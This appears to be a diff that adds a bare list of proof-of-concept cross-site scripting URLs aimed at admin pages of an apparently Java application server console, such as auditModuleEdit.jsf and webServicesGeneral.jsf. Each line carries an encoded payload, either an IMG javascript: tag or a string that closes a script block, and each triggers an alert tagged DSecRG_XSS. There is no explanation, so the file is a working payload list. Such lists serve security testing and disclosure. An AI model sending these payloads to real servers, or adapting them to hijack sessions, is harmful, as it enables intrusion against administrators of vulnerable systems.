@@ -1,0 +1,8 @@
+http://www.example.com/configuration/auditModuleEdit.jsf?name=&lt;IMG SRC=javascript:alert(&#039;DSecRG_XSS&#039;)&gt;
+http://www.example.com/resourceNode/jdbcResourceEdit.jsf?name=&lt;IMG SRC=javascript:alert(&#039;DSecRG_XSS&#039;)&gt;
+http://www.example.com/applications/applications.jsf?&#039;);};alert(&quot;DSecRG_XSS&quot;);&lt;/script&gt;&lt;!--
+http://www.example.com/configuration/configuration.jsf?&#039;);};alert(&quot;DSecRG_XSS&quot;);&lt;/script&gt;&lt;!--
+http://www.example.com/customMBeans/customMBeans.jsf?&#039;);};alert(&quot;DSecRG_XSS&quot;);&lt;/script&gt;&lt;!--
+http://www.example.com/resourceNode/resources.jsf?&#039;);};alert(&quot;DSecRG_XSS&quot;);&lt;/script&gt;&lt;!--
+http://www.example.com/sysnet/registration.jsf?&#039;);};alert(&quot;DSecRG_XSS&quot;);&lt;/script&gt;&lt;!--
+http://www.example.com/webService/webServicesGeneral.jsf?&#039;);};alert(&quot;DSecRG_XSS&quot;);&lt;/script&gt;&lt;!--
